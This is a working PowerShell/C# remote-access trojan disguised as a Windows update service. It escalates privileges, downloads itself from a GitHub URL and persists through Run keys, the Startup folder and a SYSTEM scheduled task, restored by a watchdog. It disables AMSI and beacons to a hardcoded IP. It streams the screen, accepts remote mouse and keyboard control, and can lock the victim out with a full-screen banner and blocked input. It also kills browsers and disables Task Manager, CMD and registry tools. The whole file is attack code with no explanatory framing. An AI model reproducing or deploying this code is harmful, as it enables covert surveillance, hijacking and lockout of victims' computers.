$serverIP = "198.1.195.204"
$serverPort = 4000
$installName = "WinUpdateSvc"
$myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
    exit
}

$dir = "$env:ProgramData\Microsoft\Windows\Caches"
$scriptPath = "$dir\$installName.ps1"
$vbsPath = "$dir\$installName.vbs"

# Se for a primeira execução (tela aberta), prepara o ambiente e esconde
if ($args -notcontains "-silent") {
    New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
    try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
    
    # Cria VBS para rodar invisível (Bypass no Windows 11)
    $vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $scriptPath + '"" -silent", 0, False'
    Set-Content -Path $vbsPath -Value $vbsContent -Force -ErrorAction SilentlyContinue
    
    $cmd = "wscript.exe //B //Nologo `"$vbsPath`""
    
    # 1. Registro (HKCU e HKLM)
    try {
        Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
    } catch {}

    # 2. Pasta Startup (Copia o VBS)
    try {
        $startup = [Environment]::GetFolderPath('Startup')
        Copy-Item $vbsPath "$startup\$installName.vbs" -Force -ErrorAction SilentlyContinue
    } catch {}

    # 3. Agendador de Tarefas (Roda como SYSTEM no Boot e Login)
    try {
        $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B //Nologo `"$vbsPath`""
        $trigger1 = New-ScheduledTaskTrigger -AtStartup
        $trigger2 = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 0)
        Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1,$trigger2 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
    } catch {}
    
    # Oculta os arquivos
    attrib +h +s +r $scriptPath 2>$null
    attrib +h +s +r $vbsPath 2>$null
    
    # Inicia o modo invisível e fecha a tela
    Start-Process wscript.exe -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
    exit
}

# ===== MODO INVISÍVEL (AGENTE C#) =====
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }

if (-not ("R9KAgent" -as [type])) {
    Add-Type -ReferencedAssemblies System.Windows.Forms, System.Drawing @"
    using System;
    using System.Drawing;
    using System.Drawing.Imaging;
    using System.IO;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Threading;
    using System.Net.Sockets;
    using System.Windows.Forms;
    using Microsoft.Win32;
    using System.Diagnostics;
    using System.Net;

    public class R9KAgent {
        [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
        [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
        [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);

        static string IP;
        static int PORT;
        static bool streaming = false;
        static object writeLock = new object();
        static bool isLocked = false;
        static int targetX = 0, targetY = 0;
        static bool hasNewPos = false;
        
        static Form bannerForm = null;
        static Thread bannerThread = null;

        public static void Start(string ip, int port) {
            IP = ip; PORT = port;
            
            Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();
            Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start();

            while (true) {
                TcpClient myClient = null;
                try {
                    myClient = new TcpClient();
                    myClient.Connect(IP, PORT);
                    myClient.NoDelay = true;
                    NetworkStream myStream = myClient.GetStream();
                    StreamReader myReader = new StreamReader(myStream, new UTF8Encoding(false));
                    StreamWriter myWriter = new StreamWriter(myStream, new UTF8Encoding(false));
                    myWriter.AutoFlush = true;

                    myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");

                    Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
                    Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();

                    while (myClient.Connected) {
                        Thread.Sleep(500);
                    }
                } catch { 
                    Thread.Sleep(3000); 
                } finally {
                    streaming = false;
                    try { if (myClient != null) myClient.Close(); } catch {}
                }
            }
        }

        static void WatchdogLoop() {
            string dir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches";
            string scriptPath = dir + @"\WinUpdateSvc.ps1";
            string vbsPath = dir + @"\WinUpdateSvc.vbs";
            
            while (true) {
                try {
                    if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);

                    // Restaura o Script PS1
                    if (!File.Exists(scriptPath)) {
                        string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
                        using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, scriptPath); }
                        File.SetAttributes(scriptPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
                    }
                    
                    // Restaura o VBS
                    if (!File.Exists(vbsPath)) {
                        string vbs = "CreateObject(\"WScript.Shell\").Run \"powershell.exe -nop -w hidden -ep bypass -f \"\"" + scriptPath + "\"\" -silent\", 0, False";
                        File.WriteAllText(vbsPath, vbs);
                        File.SetAttributes(vbsPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
                    }

                    // Restaura o Registro
                    string cmd = "wscript.exe //B //Nologo \"" + vbsPath + "\"";
                    using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
                        if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
                    }
                    using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
                        if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
                    }
                    
                    // Restaura a Pasta Startup
                    string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                    string startupVbs = Path.Combine(startup, "WinUpdateSvc.vbs");
                    if (!File.Exists(startupVbs)) {
                        try { File.Copy(vbsPath, startupVbs, true); File.SetAttributes(startupVbs, FileAttributes.Hidden | FileAttributes.System); } catch {}
                    }
                } catch {}
                Thread.Sleep(5000);
            }
        }

        static void ReadLoop(TcpClient myClient, StreamReader myReader, StreamWriter myWriter) {
            try {
                while (myClient.Connected) {
                    string cmd = myReader.ReadLine();
                    if (cmd == null) break;
                    ProcessCommand(cmd.Trim(), myWriter);
                }
            } catch {}
            try { myClient.Close(); } catch {}
        }

        static void InputLoop() {
            while (true) {
                try {
                    if (isLocked) {
                        if (Cursor.Position.X != targetX || Cursor.Position.Y != targetY) { Cursor.Position = new Point(targetX, targetY); }
                    } else {
                        if (hasNewPos) { Cursor.Position = new Point(targetX, targetY); hasNewPos = false; }
                    }
                } catch {}
                Thread.Sleep(10);
            }
        }

        static void StreamLoop(TcpClient myClient, StreamWriter myWriter) {
            while (myClient.Connected) {
                try {
                    if (streaming) {
                        string b64 = CaptureScreen(1280, 40);
                        if (b64 != null) {
                            lock (writeLock) { myWriter.WriteLine("SCREEN:" + b64); }
                        }
                        Thread.Sleep(30); 
                    } else { Thread.Sleep(50); }
                } catch { Thread.Sleep(1000); }
            }
        }

        static void ProcessCommand(string cmd, StreamWriter myWriter) {
            try {
                if (cmd == "stream_start") { streaming = true; return; }
                if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                
                if (cmd == "banner_on") {
                    BlockInput(true);
                    bannerThread = new Thread(() => {
                        try {
                            Image bgImg = null;
                            try {
                                using (var wc = new WebClient()) {
                                    wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                                    byte[] imgBytes = wc.DownloadData("https://i.imgur.com/gx1MwjP.jpeg");
                                    using (MemoryStream ms = new MemoryStream(imgBytes)) {
                                        bgImg = Image.FromStream(ms);
                                    }
                                }
                            } catch {}

                            bannerForm = new Form();
                            bannerForm.FormBorderStyle = FormBorderStyle.None;
                            bannerForm.WindowState = FormWindowState.Maximized;
                            bannerForm.TopMost = true;
                            bannerForm.ShowInTaskbar = false;
                            bannerForm.BackColor = Color.Black;
                            
                            if (bgImg != null) {
                                bannerForm.BackgroundImage = bgImg;
                                bannerForm.BackgroundImageLayout = ImageLayout.Stretch;
                            } else {
                                bannerForm.Controls.Add(new Label { Text = "SISTEMA BLOQUEADO", ForeColor = Color.Red, Font = new Font("Arial", 48), Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter });
                            }
                            
                            bannerForm.KeyPreview = true;
                            bannerForm.KeyDown += (s, e) => { e.SuppressKeyPress = true; };
                            Application.Run(bannerForm);
                        } catch {}
                    });
                    bannerThread.SetApartmentState(ApartmentState.STA);
                    bannerThread.IsBackground = true;
                    bannerThread.Start();
                    lock(writeLock) { myWriter.WriteLine("BANNER_ON"); }
                    return;
                }

                if (cmd == "banner_off") {
                    BlockInput(false);
                    if (bannerForm != null) {
                        try { bannerForm.BeginInvoke(new Action(() => bannerForm.Close())); } catch {}
                        bannerForm = null;
                    }
                    if (bannerThread != null) { bannerThread.Abort(); bannerThread = null; }
                    lock(writeLock) { myWriter.WriteLine("BANNER_OFF"); }
                    return;
                }

                if (cmd == "uninstall") { 
                    BlockInput(false); 
                    UnblockAllApps();
                    try {
                        using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
                        using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
                        Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateService /f").WaitForExit();
                        string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                        string startupVbs = Path.Combine(startup, "WinUpdateSvc.vbs");
                        if (File.Exists(startupVbs)) { File.SetAttributes(startupVbs, FileAttributes.Normal); File.Delete(startupVbs); }
                        
                        string scriptPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.ps1";
                        string vbsPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.vbs";
                        if (File.Exists(scriptPath)) { File.SetAttributes(scriptPath, FileAttributes.Normal); File.Delete(scriptPath); }
                        if (File.Exists(vbsPath)) { File.SetAttributes(vbsPath, FileAttributes.Normal); File.Delete(vbsPath); }
                    } catch {}
                    Environment.Exit(0); 
                }
                
                if (cmd == "block_apps") { BlockAllApps(); lock(writeLock) { myWriter.WriteLine("APPS_BLOQUEADOS"); } return; }
                if (cmd == "unblock_apps") { UnblockAllApps(); lock(writeLock) { myWriter.WriteLine("APPS_DESBLOQUEADOS"); } return; }

                if (cmd == "lock_mouse") { targetX = Cursor.Position.X; targetY = Cursor.Position.Y; isLocked = true; BlockInput(true); lock(writeLock) { myWriter.WriteLine("MOUSE_TRAVADO"); } return; }
                if (cmd == "unlock_mouse") { isLocked = false; BlockInput(false); lock(writeLock) { myWriter.WriteLine("MOUSE_SOLTO"); } return; }
                if (cmd == "screenshot") { lock(writeLock) { myWriter.WriteLine("SCREEN:" + CaptureScreen(1920, 85)); } return; }
                if (cmd == "ping") { lock(writeLock) { myWriter.WriteLine("PONG"); } return; }

                if (cmd.StartsWith("move ")) {
                    string[] p = cmd.Split(' ');
                    int nx = int.Parse(p[1]); int ny = int.Parse(p[2]);
                    targetX = (int)((nx / 65535.0) * Screen.PrimaryScreen.Bounds.Width);
                    targetY = (int)((ny / 65535.0) * Screen.PrimaryScreen.Bounds.Height);
                    hasNewPos = true; 
                }
                else if (cmd == "md 1") mouse_event(0x0002, 0, 0, 0, 0);
                else if (cmd == "mu 1") mouse_event(0x0004, 0, 0, 0, 0);
                else if (cmd == "md 2") mouse_event(0x0008, 0, 0, 0, 0);
                else if (cmd == "mu 2") mouse_event(0x0010, 0, 0, 0, 0);
                else if (cmd == "md 3") mouse_event(0x0020, 0, 0, 0, 0);
                else if (cmd == "mu 3") mouse_event(0x0040, 0, 0, 0, 0);
                else if (cmd.StartsWith("mw ")) mouse_event(0x0800, 0, 0, (uint)int.Parse(cmd.Substring(3)), 0);
                else if (cmd.StartsWith("kd ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 0, UIntPtr.Zero);
                else if (cmd.StartsWith("ku ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 2, UIntPtr.Zero);
            } catch {}
        }

        static void BlockAllApps() {
            try { Process.Start("taskkill", "/F /IM explorer.exe").WaitForExit(); } catch {}
            string[] browsers = { "chrome", "msedge", "firefox", "opera", "brave" };
            foreach(var b in browsers) { try { Process.Start("taskkill", "/F /IM " + b + ".exe").WaitForExit(); } catch {} }

            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")) {
                key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
                key.SetValue("NoRun", 1, RegistryValueKind.DWord);
                key.SetValue("NoDesktop", 1, RegistryValueKind.DWord);
            }
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System")) {
                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
            }
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System")) {
                key.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
            }
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System")) {
                key.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
            }

            string[] apps = { "chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe", "notepad.exe", "wordpad.exe", "calc.exe", "mspaint.exe", "explorer.exe" };
            foreach (var app in apps) {
                try {
                    using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + app)) {
                        key.SetValue("Debugger", "svchost.exe");
                    }
                } catch {}
            }
        }

        static void UnblockAllApps() {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true)) {
                if (key != null) {
                    key.DeleteValue("NoViewOnDrive", false);
                    key.DeleteValue("NoRun", false);
                    key.DeleteValue("NoDesktop", false);
                }
            }
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true)) {
                if (key != null) {
                    key.DeleteValue("DisableTaskMgr", false);
                    key.DeleteValue("DisableRegistryTools", false);
                }
            }
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Policies\Microsoft\Windows\System", true)) {
                if (key != null) key.DeleteValue("DisableCMD", false);
            }
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System", true)) {
                if (key != null) key.DeleteValue("DisableCMD", false);
            }

            string[] apps = { "chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe", "notepad.exe", "wordpad.exe", "calc.exe", "mspaint.exe", "explorer.exe" };
            foreach (var app in apps) {
                try { Registry.LocalMachine.DeleteSubKeyTree(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + app, false); } catch {}
            }

            try { Process.Start("explorer.exe"); } catch {}
        }

        static string CaptureScreen(int maxW, long quality) {
            try {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height)) {
                    using (Graphics g = Graphics.FromImage(bmp)) { g.CopyFromScreen(0, 0, 0, 0, bmp.Size); }
                    Bitmap finalBmp = bmp;
                    if (maxW > 0 && bmp.Width > maxW) {
                        int newW = maxW, newH = (int)(bmp.Height * ((float)maxW / bmp.Width));
                        finalBmp = new Bitmap(newW, newH);
                        using (Graphics g2 = Graphics.FromImage(finalBmp)) {
                            g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
                            g2.DrawImage(bmp, 0, 0, newW, newH);
                        }
                    }
                    using (MemoryStream ms = new MemoryStream()) {
                        EncoderParameters ep = new EncoderParameters(1);
                        ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
                        ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
                        ImageCodecInfo codec = null;
                        foreach (var c in codecs) { if (c.FormatID == ImageFormat.Jpeg.Guid) { codec = c; break; } }
                        finalBmp.Save(ms, codec, ep);
                        if (finalBmp != bmp) finalBmp.Dispose();
                        return Convert.ToBase64String(ms.ToArray());
                    }
                }
            } catch { return null; }
        }
    }
"@
}

[R9KAgent]::Start($serverIP, $serverPort)
